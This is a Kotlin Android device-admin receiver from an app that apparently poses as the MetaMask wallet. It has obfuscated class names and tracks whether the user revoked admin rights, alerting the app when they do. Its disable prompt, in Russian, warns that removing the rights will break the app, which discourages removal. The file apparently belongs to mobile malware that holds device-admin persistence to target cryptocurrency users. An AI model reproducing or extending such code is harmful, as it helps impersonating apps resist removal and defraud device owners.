package com.example.MetaMask.receivers

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import androidx.annotation.Keep
import com.example.MetaMask.ChainBridge
import com.example.MetaMask.activities.CoralCobraActivity

@Keep
class BadgerFalconRecv : DeviceAdminReceiver() {

    override fun onEnabled(context: Context, intent: Intent) {
        android.util.Log.d("XDBG", "[BadgerFalconRecv] onEnabled enter context=ctx intent=${intent}") //xdbg
        super.onEnabled(context, intent)
        context.getSharedPreferences("da_revoke_prefs", Context.MODE_PRIVATE)
            .edit().putBoolean("panel_revoked", false).commit()
        CoralCobraActivity.notifyAdminEnabledFromSystem()
    }

    override fun onDisabled(context: Context, intent: Intent) {
        android.util.Log.d("XDBG", "[BadgerFalconRecv] onDisabled enter context=ctx intent=${intent}") //xdbg
        super.onDisabled(context, intent)
        val prefs = context.getSharedPreferences("da_revoke_prefs", Context.MODE_PRIVATE)
        if (prefs.getBoolean("panel_revoked", false)) {
            android.util.Log.d("XDBG", "[BadgerFalconRecv] if branch") //xdbg
            prefs.edit().putBoolean("panel_revoked", false).commit()
            return
        }
        context.sendBroadcast(Intent(ChainBridge.ACTION_USER_REVOKED_ADMIN).apply {
            setPackage(context.packageName)
        })
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        android.util.Log.d("XDBG", "[BadgerFalconRecv] onDisableRequested enter context=ctx intent=${intent}") //xdbg
        android.util.Log.d("XDBG", "[BadgerFalconRecv] return") //xdbg
        return "Отключение администратора устройства может нарушить работу приложения."
    }
}
